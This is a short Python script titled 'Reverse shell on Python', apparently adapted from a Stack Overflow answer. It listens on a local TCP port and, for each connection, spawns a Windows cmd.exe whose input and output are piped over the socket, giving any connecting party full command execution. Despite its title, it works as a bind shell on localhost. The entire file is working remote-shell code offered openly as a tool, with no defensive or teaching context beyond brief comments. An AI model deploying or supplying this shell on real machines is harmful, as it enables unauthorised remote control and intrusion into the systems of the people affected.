# Reverse shell on Python

# https://stackoverflow.com/a/39683398

# Open CMD.EXE on a subprocess
# We have two interfaces

# 1. Socket  -> Process  -  Socket Input     -> STDIN (CMD.EXE) - Function send
# 2. Process -> Socket  -  STDOUT (CMD.EXE) -> Socket Output    - Function recv


import socket, threading, subprocess


# Function reverseshell:
# - Receive a connected socket (argument: sock)
# - Create a CMD.exe for it
# - Create two subprocesses for STDIN and STDOUT

def reverseshell(sock):

    # Function recv: Write on STDIN what it receives from sock to cmd and flush

    def recv(sock, cmd):
        while True:
            data = sock.recv(1024).decode()
            cmd.stdin.write(data)
            try:
                cmd.stdin.flush()
            except:
                print("Conn closed?recv")
                pass
    
    # Function send: Read from STDOUT on cmd and send it to sock

    def send(sock, cmd):
        while True:
            data = cmd.stdout.read(1).encode()
            sock.send(data)

    # Create the cmd subprocess and start the threads

    cmd = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
    threading.Thread(target=recv, args=[sock, cmd], daemon=True).start()
    threading.Thread(target=send, args=[sock, cmd], daemon=True).start()

    # Now we wait for cmd to exit and we close sock
    
    try:
        cmd.wait()
    except:
        sock.close()
        print
        exit(0)


# Creating the socket

HOST = "127.0.0.1"
PORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen()

# Main loop: Get any connection and start reversheshell(s)

while True:
    try:
        conn, addr = s.accept()

        print(f"Starting reverse shell with {addr}")

        threading.Thread(target=reverseshell, args=[conn], daemon=True).start()
    except:
        pass
